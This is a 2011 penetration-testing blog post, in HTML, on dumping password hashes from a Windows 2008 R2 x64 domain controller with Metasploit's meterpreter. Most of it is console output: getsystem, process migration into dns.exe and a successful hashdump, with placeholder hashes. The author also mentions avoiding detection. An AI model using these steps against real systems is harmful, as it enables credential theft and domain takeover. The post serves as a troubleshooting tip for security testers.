@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Dumping Hashes on Win2k8 R2 x64 with Metasploit" />
+<meta property="og:description" content="When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2011-05-16T02:35:31+00:00" />
+<meta property="article:modified_time" content="2011-05-16T02:35:31+00:00" /><meta property="og:site_name" content="My cool site" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Dumping Hashes on Win2k8 R2 x64 with Metasploit"/>
+<meta name="twitter:description" content="When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:"/>
+<meta name="application-name" content="malicious.link">
+<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" /><link rel="prev" href="https://malicious.link/posts/2011/2011-04-12-exploitable-mobile-app-challenge/" /><link rel="next" href="https://malicious.link/posts/2011/2011-05-30-remote-dll-injection-with-meterpreter/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Dumping Hashes on Win2k8 R2 x64 with Metasploit",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/malicious.link\/posts\/2011\/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit\/"
+        },"genre": "posts","wordcount":  1153 ,
+        "url": "https:\/\/malicious.link\/posts\/2011\/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit\/","datePublished": "2011-05-16T02:35:31+00:00","dateModified": "2011-05-16T02:35:31+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "mubix"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Dumping Hashes on Win2k8 R2 x64 with Metasploit</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>mubix</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hashdump/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>hashdump</a>&nbsp;<a href="/categories/metasploit/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>metasploit</a>&nbsp;<a href="/categories/meterpreter/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>meterpreter</a>&nbsp;<a href="/categories/cracking/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>cracking</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2011-05-16">2011-05-16</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1153 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
+            </div><div class="content" id="content"><p>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &ldquo;The parameter is incorrect&rdquo; error in meterpreter. So I&rsquo;ve had to fall back on dropping binaries which I really don&rsquo;t like doing because of the added clean up and chance of getting &lsquo;caught&rsquo;. Well, with a bit of migration you&rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                ##                          ###           ##    ##
+</span></span><span class="line"><span class="cl"> ##  ##  #### ###### ####  #####   #####    ##    ####        ######
+</span></span><span class="line"><span class="cl">####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##
+</span></span><span class="line"><span class="cl">####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##
+</span></span><span class="line"><span class="cl">## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##
+</span></span><span class="line"><span class="cl">##   ##  #### ###   #####   #####     ##   ####   ####   #### ###
+</span></span><span class="line"><span class="cl">                                      ##
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       =[ metasploit v3.7.1-release [core:3.7 api:1.0]
+</span></span><span class="line"><span class="cl">+ -- --=[ 687 exploits - 364 auxiliary - 43 post
+</span></span><span class="line"><span class="cl">+ -- --=[ 217 payloads - 27 encoders - 8 nops
+</span></span><span class="line"><span class="cl">       =[ svn r12622 updated today (2011.05.15)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf &gt; 
+</span></span><span class="line"><span class="cl">[*] DC_IP:49220 Request received for /AYSBk...
+</span></span><span class="line"><span class="cl">[*] DC_IP:49220 Staging connection for target YSBk received...
+</span></span><span class="line"><span class="cl">[*] Patching Target ID YSBk into DLL
+</span></span><span class="line"><span class="cl">[*] DC_IP:49221 Request received for /BYSBk...
+</span></span><span class="line"><span class="cl">[*] DC_IP:49221 Stage connection for target YSBk received...
+</span></span><span class="line"><span class="cl">[*] Meterpreter session 7 opened (ATTACKER_IP:443 -&gt; DC_IP:49221) at Sun May 15 21:37:31 +0000 2011
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">msf &gt; sessions -i 7
+</span></span><span class="line"><span class="cl">[*] Starting interaction with 7...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
+</span></span><span class="line"><span class="cl">System Language : en_US
+</span></span><span class="line"><span class="cl">OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
+</span></span><span class="line"><span class="cl">Computer        : DOMAINCONTROLLE
+</span></span><span class="line"><span class="cl">Architecture    : x64 (Current Process is WOW64)
+</span></span><span class="line"><span class="cl">Meterpreter     : x86/win32
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; ps
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Process list
+</span></span><span class="line"><span class="cl">============
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> PID   Name                                       Arch  Session  User                          Path
+</span></span><span class="line"><span class="cl"> ---   ----                                       ----  -------  ----                          ----
+</span></span><span class="line"><span class="cl"> 0     [System Process]                                                                        
+</span></span><span class="line"><span class="cl"> 4     System                                     x64   0                                      
+</span></span><span class="line"><span class="cl"> 224   smss.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
+</span></span><span class="line"><span class="cl"> 324   csrss.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+</span></span><span class="line"><span class="cl"> 364   csrss.exe                                  x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+</span></span><span class="line"><span class="cl"> 372   wininit.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
+</span></span><span class="line"><span class="cl"> 404   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+</span></span><span class="line"><span class="cl"> 468   services.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
+</span></span><span class="line"><span class="cl"> 476   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
+</span></span><span class="line"><span class="cl"> 484   lsm.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
+</span></span><span class="line"><span class="cl"> 628   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 708   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 804   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 836   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 880   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 932   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 972   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 328   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 1172  spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+</span></span><span class="line"><span class="cl"> 1204  Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
+</span></span><span class="line"><span class="cl"> 1252  dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
+</span></span><span class="line"><span class="cl"> 1288  dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
+</span></span><span class="line"><span class="cl"> 1316  ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
+</span></span><span class="line"><span class="cl"> 1360  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 1392  vmtoolsd.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+</span></span><span class="line"><span class="cl"> 1464  wlms.exe                                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wlmswlms.exe
+</span></span><span class="line"><span class="cl"> 1492  dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
+</span></span><span class="line"><span class="cl"> 1572  VMUpgradeHelper.exe                        x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMUpgradeHelper.exe
+</span></span><span class="line"><span class="cl"> 1896  TPAutoConnSvc.exe                          x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
+</span></span><span class="line"><span class="cl"> 2016  vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
+</span></span><span class="line"><span class="cl"> 872   sppsvc.exe                                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
+</span></span><span class="line"><span class="cl"> 1268  WmiPrvSE.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbemWmiPrvSE.exe
+</span></span><span class="line"><span class="cl"> 2360  taskhost.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\System32\taskhost.exe
+</span></span><span class="line"><span class="cl"> 2424  dwm.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\dwm.exe
+</span></span><span class="line"><span class="cl"> 2452  explorer.exe                               x64   1        SITTINGDUCK\juser             C:\Windows\explorer.exe
+</span></span><span class="line"><span class="cl"> 2504  TPAutoConnect.exe                          x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
+</span></span><span class="line"><span class="cl"> 2512  conhost.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\conhost.exe
+</span></span><span class="line"><span class="cl"> 2632  VMwareTray.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareTray.exe
+</span></span><span class="line"><span class="cl"> 2640  VMwareUser.exe                             x64   1        SITTINGDUCK\juser             C:\Program Files\VMware\VMware Tools\VMwareUser.exe
+</span></span><span class="line"><span class="cl"> 2716  mmc.exe                                    x64   1        SITTINGDUCK\juser             C:\Windows\System32\mmc.exe
+</span></span><span class="line"><span class="cl"> 3052  mscorsvw.exe                               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Frameworkv4.0.30319\mscorsvw.exe
+</span></span><span class="line"><span class="cl"> 2216  TrustedInstaller.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
+</span></span><span class="line"><span class="cl"> 1932  mscorsvw.exe                               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft\.NET\Framework\64\v4.0.30319\mscorsvw.exe
+</span></span><span class="line"><span class="cl"> 2564  svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+</span></span><span class="line"><span class="cl"> 1732  msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
+</span></span><span class="line"><span class="cl"> 2992  notepad.exe                                x86   1        SITTINGDUCK\juser             C:\Windows\SysWOW64\notepad.exe
+</span></span><span class="line"><span class="cl"> 1720  notepad.exe                                x64   1        SITTINGDUCK\juser             C:\Windows\System32\notepad.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; getpid
+</span></span><span class="line"><span class="cl">Current pid: 2992
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; hashdump
+</span></span><span class="line"><span class="cl">[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ah, the wonderful &lsquo;The parameter is incorrect&rsquo; error. Ok we are an admin since we can see the user for SYSTEM processes, so that isn&rsquo;t the issue, but lets do a &lsquo;getprivs&rsquo; just in case:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getprivs    
+</span></span><span class="line"><span class="cl">============================================================
+</span></span><span class="line"><span class="cl">Enabled Process Privileges
+</span></span><span class="line"><span class="cl">============================================================
+</span></span><span class="line"><span class="cl">  SeDebugPrivilege
+</span></span><span class="line"><span class="cl">  SeIncreaseQuotaPrivilege
+</span></span><span class="line"><span class="cl">  SeMachineAccountPrivilege
+</span></span><span class="line"><span class="cl">  SeSecurityPrivilege
+</span></span><span class="line"><span class="cl">  SeTakeOwnershipPrivilege
+</span></span><span class="line"><span class="cl">  SeLoadDriverPrivilege
+</span></span><span class="line"><span class="cl">  SeSystemProfilePrivilege
+</span></span><span class="line"><span class="cl">  SeSystemtimePrivilege
+</span></span><span class="line"><span class="cl">  SeProfileSingleProcessPrivilege
+</span></span><span class="line"><span class="cl">  SeIncreaseBasePriorityPrivilege
+</span></span><span class="line"><span class="cl">  SeCreatePagefilePrivilege
+</span></span><span class="line"><span class="cl">  SeBackupPrivilege
+</span></span><span class="line"><span class="cl">  SeRestorePrivilege
+</span></span><span class="line"><span class="cl">  SeShutdownPrivilege
+</span></span><span class="line"><span class="cl">  SeSystemEnvironmentPrivilege
+</span></span><span class="line"><span class="cl">  SeChangeNotifyPrivilege
+</span></span><span class="line"><span class="cl">  SeRemoteShutdownPrivilege
+</span></span><span class="line"><span class="cl">  SeUndockPrivilege
+</span></span><span class="line"><span class="cl">  SeEnableDelegationPrivilege
+</span></span><span class="line"><span class="cl">  SeManageVolumePrivilege
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; hashdump
+</span></span><span class="line"><span class="cl">[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Boo.. Ok, so maybe we have to be &lsquo;SYSTEM&rsquo;&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getsystem
+</span></span><span class="line"><span class="cl">...got system (via technique 1).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; hashdump
+</span></span><span class="line"><span class="cl">[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Still nothing&hellip; Maybe it requires that we be in a 64 bit process&hellip; PID 1720 was 64 bit version of Notepad, lets try that&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; migrate 1720
+</span></span><span class="line"><span class="cl">[*] Migrating to 1720...
+</span></span><span class="line"><span class="cl">[*] Migration completed successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; hashdump
+</span></span><span class="line"><span class="cl">[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Damn, what about as &lsquo;SYSTEM&rsquo;&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getsystem ...got system (via technique 1).  
+</span></span><span class="line"><span class="cl">meterpreter &gt; hashdump 
+</span></span><span class="line"><span class="cl">[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>No joy.. hmmm What about a &lsquo;SYSTEM&rsquo; process that was already there.. &lsquo;dns.exe&rsquo; PID 1288 should be good&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; migrate 1288
+</span></span><span class="line"><span class="cl">[*] Migrating to 1288...
+</span></span><span class="line"><span class="cl">[*] Migration completed successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; hashdump
+</span></span><span class="line"><span class="cl">Administrator:500:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">Guest:501:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">krbtgtG:502:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">Domain Admin?:1000:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">juserN:1104:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">jane.user??:1105:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">DOMAINCONTROLLE$?:1001:MYLMHASH:MYNTLMHASH:::
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>w00t. So I don&rsquo;t know why, but it seems that you have to be in a &lsquo;SYSTEM&rsquo; process who&rsquo;s primary token (started by SYSTEM) is SYSTEM (since &lsquo;getsystem&rsquo; wasn&rsquo;t working). I also tried this getting SYSTEM to run a 32 bit process, and was still unable to dump hashes. So next time you&rsquo;re on an Win2k8 R2 64 bit box, remember to migrate into a pre-existing 64bit SYSTEM process and you should be good to go.</p>
+<p><strong>Update</strong> on 2011-05-15 23:39 by Rob Fuller</p>
